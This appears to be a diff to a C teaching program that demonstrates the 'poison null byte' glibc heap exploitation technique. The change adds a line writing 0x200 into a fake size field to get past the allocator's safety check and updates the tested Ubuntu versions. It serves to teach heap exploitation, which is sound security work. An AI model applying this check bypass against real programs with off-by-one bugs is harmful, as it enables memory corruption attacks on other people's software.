@@ -8,7 +8,7 @@
 int main()
 {
 	fprintf(stderr, "Welcome to poison null byte 2.0!\n");
-	fprintf(stderr, "Tested in Ubuntu 14.04 64bit.\n");
+	fprintf(stderr, "Tested in Ubuntu 14.04 64bit and 16.04.\n");
 	fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
 
 	uint8_t* a;
@@ -17,6 +17,7 @@ int main()
 	uint8_t* b1;
 	uint8_t* b2;
 	uint8_t* d;
+	uint64_t* c_malloc_check;
 	void *barrier;
 
 	fprintf(stderr, "We allocate 0x100 bytes for 'a'.\n");
@@ -52,6 +53,9 @@ int main()
 	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
 
 	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
+	//pass the malloc safety check
+	c_malloc_check=((uint64_t*)c)-4;
+	*c_malloc_check=0x200;
 	fprintf(stderr, "c.prev_size is %#lx\n",*c_prev_size_ptr);
 
 	b1 = malloc(0x100);
